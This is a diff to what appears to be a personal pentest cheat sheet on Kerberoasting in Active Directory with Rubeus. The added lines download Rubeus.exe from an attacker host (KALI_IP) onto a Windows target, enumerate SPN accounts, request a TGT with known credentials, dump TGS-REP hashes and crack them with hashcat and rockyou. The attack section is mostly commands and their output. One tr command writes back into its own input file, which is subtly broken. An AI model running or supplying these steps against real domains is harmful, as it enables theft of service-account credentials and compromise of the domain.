@@ -173,7 +173,19 @@ krbtgt
 
 ### Rubeus: Kerberoasting Tool
 
+e.g  TGS-REP password cracking attack against an AD service account with an SPN
+
+prerequisite: 
+- normal domain user access
+- network access to DC
+- At least one account with an SPN
+- Crackable password quality
+- target service account must not be disabled 
+	e.g. `!(UserAccountControl:...:=2)` -> disabled account 
+
+find kerberoastable account: 
 ```powershell 
+PS C:\Tools> iwr http://KALI_IP:80/privesc/Rubeus.exe -OutFile C:\Windows\Temp\Rubeus.exe
 PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast  
   
    ______        _  
@@ -191,6 +203,8 @@ PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 [*] Target Domain          : domain.com
 [*] Searching path 'LDAP://DC01.domain.com/DC=domain,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
 [*] Total kerberoastable users : 1
+
+# Rubeus found 1 kerberoastable account! 
 [*] SamAccountName         : iis_service
 [*] DistinguishedName      : CN=iis_service,CN=Users,DC=domain,DC=com
 [*] ServicePrincipalName   : HTTP/WEB_HOSTNAME.DOMAIN.com:80
@@ -227,6 +241,53 @@ $krb5tgs$23$*iis_service$domain.com$HTTP/WEB_HOSTNAME.domain.com:80@domain.com*$
 ```  
 [hashcat reference page](../03-tools/hashcat_johntheripper.md)
 
+e.g. TGT request with known user credentials
+- Use domain_user's password to request a real TGT from the KDC.
+
+prerequisites: 
+- valid domain user credentials or an authenticated domain session  
+- network access to the Domain Controller  
+- at least one enabled account with an SPN  
+- a service account password weak enough to crack offline
+
+```powershell
+PS C:\Windows\Temp> iwr http://KALI_IP:80/privesc/Rubeus.exe -OutFile C:\Windows\Temp\Rubeus.exe
+
+PS C:\Windows\Temp> .\Rubeus.exe asktgt /user:domain_user /password:domain_user_pw /domain:domain.com /dc:DC_IP /outfile:tgt.kirbi
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: REDACTED_HASH
+[*] Building AS-REQ (w/ preauth) for: 'domain.com\domain_user'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+      REDACTED_HASH/REDACTED_HASH
+[*] Ticket written to tgt.kirbi
+
+
+PS C:\Windows\Temp> .\Rubeus.exe kerberoast
+
+[*] Action: Kerberoasting
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+[*] Searching the current domain for Kerberoastable users
+[*] Total kerberoastable users : 1
+
+[*] SamAccountName         : domain_user_2
+[*] DistinguishedName      : CN=domain_user_2,CN=Users,DC=laser,DC=com
+[*] ServicePrincipalName   : MSSQLSvc/asdf
+[*] PwdLastSet             : TIME
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*domain_user_2$domain.com$MSSQLSvc/asdf*$REDACTED_HASH...
+```
+-> `$krb5tgs$23$` -> Kerberos 5 TGS-REP etype 23, hashcat mode 13100
+
+now crack password
+```bash
+└─$ sed -n '1p' domain_user_2.hash
+└─$ tr -d '[:space:]' < domain_user_2.hash > domain_user_2.hash
+└─$ sudo hashcat -m 13100 domain_user_2.hash /usr/share/wordlists/rockyou.txt --force 
+```
 
 ---
 
